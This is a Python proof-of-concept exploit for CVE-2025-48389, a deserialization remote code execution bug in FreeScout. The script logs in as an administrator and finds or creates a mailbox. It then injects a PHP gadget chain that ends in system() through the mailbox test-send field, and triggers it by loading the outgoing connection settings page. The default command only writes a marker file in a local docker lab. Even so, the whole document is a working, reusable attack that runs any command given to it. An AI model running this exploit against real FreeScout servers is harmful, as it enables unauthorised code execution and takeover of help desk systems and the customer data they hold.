#!/usr/bin/env python3
"""
CVE-2025-48389 - FreeScout Deserialization RCE PoC
Vulnerability in Option::set and Option::get methods allows arbitrary code execution
"""

import requests
import re
import sys
import time
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class FreeScoutExploit:
    def __init__(self, target_url, admin_email, admin_password):
        self.target_url = target_url.rstrip('/')
        self.admin_email = admin_email
        self.admin_password = admin_password
        self.session = requests.Session()
        self.session.verify = False

    def get_csrf_token(self, html_content):
        match = re.search(r'<meta name="csrf-token" content="([^"]+)"', html_content)
        if match:
            return match.group(1)
        match = re.search(r'name="_token"\s+value="([^"]+)"', html_content)
        if match:
            return match.group(1)
        return None

    def login(self):
        print("[*] Attempting to login...")
        login_page = self.session.get(f"{self.target_url}/login")
        csrf_token = self.get_csrf_token(login_page.text)
        if not csrf_token:
            print("[-] Failed to get CSRF token from login page")
            return False

        login_data = {
            "_token": csrf_token,
            "email": self.admin_email,
            "password": self.admin_password
        }

        resp = self.session.post(
            f"{self.target_url}/login",
            data=login_data,
            allow_redirects=True
        )

        if "logout" in resp.text.lower() or "/mailbox" in resp.text:
            print("[+] Login successful")
            return True
        else:
            print("[-] Login failed")
            return False

    def get_or_create_mailbox(self):
        print("[*] Getting or creating mailbox...")
        
        resp = self.session.get(f"{self.target_url}/mailboxes")
        
        mailbox_match = re.search(r'/mailbox/(\d+)', resp.text)
        if mailbox_match:
            mailbox_id = mailbox_match.group(1)
            print(f"[+] Found existing mailbox ID: {mailbox_id}")
            return mailbox_id
        
        print("[*] Creating new mailbox...")
        create_page = self.session.get(f"{self.target_url}/mailbox/new")
        csrf_token = self.get_csrf_token(create_page.text)
        
        if not csrf_token:
            print("[-] Failed to get CSRF token")
            return None
        
        mailbox_data = {
            "_token": csrf_token,
            "name": "Test",
            "email": "test@vuln.local"
        }
        
        resp = self.session.post(
            f"{self.target_url}/mailbox/new",
            data=mailbox_data,
            allow_redirects=True
        )
        
        mailbox_match = re.search(r'/mailbox/(\d+)', resp.url)
        if mailbox_match:
            mailbox_id = mailbox_match.group(1)
            print(f"[+] Created mailbox ID: {mailbox_id}")
            return mailbox_id
        
        mailbox_match = re.search(r'/mailbox/(\d+)', resp.text)
        if mailbox_match:
            mailbox_id = mailbox_match.group(1)
            print(f"[+] Created mailbox ID: {mailbox_id}")
            return mailbox_id
        
        return None

    def build_payload(self, command):
        payload = (
            'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":1:{'
            's:9:"\x00*\x00events";'
            'O:29:"Illuminate\\Queue\\QueueManager":2:{'
            's:6:"\x00*\x00app";a:1:{'
            's:6:"config";a:2:{'
            's:13:"queue.default";s:3:"key";'
            's:21:"queue.connections.key";a:1:{'
            's:6:"driver";s:4:"func";'
            '}}}'
            's:13:"\x00*\x00connectors";a:1:{'
            's:4:"func";a:2:{'
            'i:0;O:28:"Illuminate\\Auth\\RequestGuard":3:{'
            's:11:"\x00*\x00callback";s:14:"call_user_func";'
            's:10:"\x00*\x00request";s:6:"system";'
            f's:11:"\x00*\x00provider";s:{len(command)}:"{command}";'
            '}'
            'i:1;s:4:"user";'
            '}}}}'
        )
        return payload

    def inject_payload(self, mailbox_id, command):
        print(f"[*] Injecting payload with command: {command}")
        
        settings_url = f"{self.target_url}/mailbox/connection-settings/{mailbox_id}/outgoing"
        resp = self.session.get(settings_url)
        csrf_token = self.get_csrf_token(resp.text)
        
        if not csrf_token:
            print("[-] Failed to get CSRF token from settings page")
            return False

        payload = self.build_payload(command)

        headers = {
            "X-CSRF-TOKEN": csrf_token,
            "X-Requested-With": "XMLHttpRequest",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Accept": "application/json, text/javascript, */*; q=0.01"
        }

        inject_data = {
            "action": "send_test",
            "mailbox_id": mailbox_id,
            "to": payload
        }

        resp = self.session.post(
            f"{self.target_url}/mailbox/ajax",
            data=inject_data,
            headers=headers
        )
        
        print(f"[*] Injection response status: {resp.status_code}")
        return True

    def trigger_payload(self, mailbox_id):
        print("[*] Triggering payload via Option::get...")
        trigger_url = f"{self.target_url}/mailbox/connection-settings/{mailbox_id}/outgoing"
        resp = self.session.get(trigger_url)
        return resp

    def exploit(self):
        if not self.login():
            return False

        mailbox_id = self.get_or_create_mailbox()
        if not mailbox_id:
            print("[-] Failed to get/create mailbox")
            return False
        
        marker_file = "/tmp/cve_2025_48389_poc"
        create_cmd = f"echo 'CVE-2025-48389-PWNED' > {marker_file}"
        
        if not self.inject_payload(mailbox_id, create_cmd):
            print("[-] Failed to inject payload")
            return False
        
        self.trigger_payload(mailbox_id)
        time.sleep(1)
        
        print("[+] Exploit completed")
        print(f"[*] Verify with: docker exec freescout-app cat {marker_file}")
        return True


def main():
    target_url = "http://localhost:8088"
    admin_email = "admin@example.com"
    admin_password = "Admin@123456"
    
    if len(sys.argv) > 1:
        target_url = sys.argv[1]
    if len(sys.argv) > 2:
        admin_email = sys.argv[2]
    if len(sys.argv) > 3:
        admin_password = sys.argv[3]

    print(f"[*] Target: {target_url}")
    print(f"[*] Admin Email: {admin_email}")
    print("=" * 60)

    exploit = FreeScoutExploit(target_url, admin_email, admin_password)
    
    try:
        if exploit.exploit():
            print("[+] Exploit execution completed successfully")
            sys.exit(0)
        else:
            print("[-] Exploit failed")
            sys.exit(1)
    except requests.exceptions.ConnectionError as e:
        print(f"[-] Connection failed: {e}")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()
